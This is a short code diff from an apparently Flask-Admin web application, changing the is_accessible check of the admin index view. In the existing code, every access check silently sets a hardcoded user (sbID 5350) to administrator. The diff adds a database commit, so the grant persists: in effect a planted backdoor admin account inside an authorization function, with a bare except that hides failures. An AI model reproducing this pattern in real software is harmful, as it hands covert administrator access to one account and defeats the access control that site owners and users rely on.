@@ -101,6 +101,7 @@ class MyAdminIndexView(AdminIndexView):
     def is_accessible(self):
         try:
             User.query.filter_by(sbID=5350).update(dict(isAdmin=True))
+            db.session.commit()
             return current_user.isAdmin
         except:
             return False
